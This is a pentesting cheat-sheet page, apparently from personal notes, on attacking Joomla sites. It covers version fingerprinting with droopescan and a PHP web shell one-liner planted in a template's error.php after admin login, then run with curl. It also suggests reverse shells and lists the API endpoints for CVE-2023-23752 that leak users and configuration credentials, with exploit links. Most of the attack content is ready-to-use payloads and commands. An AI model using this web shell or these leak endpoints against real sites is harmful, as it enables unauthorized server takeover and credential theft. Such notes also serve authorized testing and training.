---
title: Joomla 🦁
---
## Check Version

- In **/administrator/manifests/files/joomla.xml** you can see the version.
- In **/language/en-GB/en-GB.xml** you can get the version of Joomla.
- In **plugins/system/cache/cache.xml** you can see an approximate version.

- Yo can also do it automatically using [droopscan](https://github.com/SamJoan/droopescan):

```shell
droopescan scan joomla --url http://joomla-site.local/
```

## Joomla database

- Check the [Official documentation](https://docs.joomla.org/Tables)

## RCE

If you managed to get **admin credentials** you can **RCE inside of it** by adding a snippet of **PHP code** to gain **RCE**. We can do this by **customizing** a **template**.

1. **Click** on `Templates` on the bottom left under `Configuration` to pull up the templates menu.
2. **Click** on a **template** name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.

![](Pasted%20image%2020240530180012.png)

3. Finally, you can click on a page to pull up the **page source**. Let's choose the `error.php` page. We'll add a **PHP one-liner to gain code execution** as follows:

 ```php
 <?php system($_GET['cmd']); ?>
 ```

4. **Save & Close**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`


>[!Note]
>You can also add in that code a reverse shell like Pentest Monkey one
>Make sure to check [Reverse shells 👾](reverse_shells.md)

### Another way

- Modify the `index.php` adding there your reverse shell

## Information disclosure

Versions From 4.0.0 to 4.2.7 are vulnerable to Unauthenticated information disclosure (CVE-2023-23752) that will dump creds and other information.

- Users: `http://<host>/api/v1/users?public=true`
- Config File: `http://<host>/api/index.php/v1/config/application?public=true`

**MSF Module**: `scanner/http/joomla_api_improper_access_checks` or ruby script: [51334](https://www.exploit-db.com/exploits/51334)
- [Github exploit & instructions](https://github.com/Acceis/exploit-CVE-2023-23752)

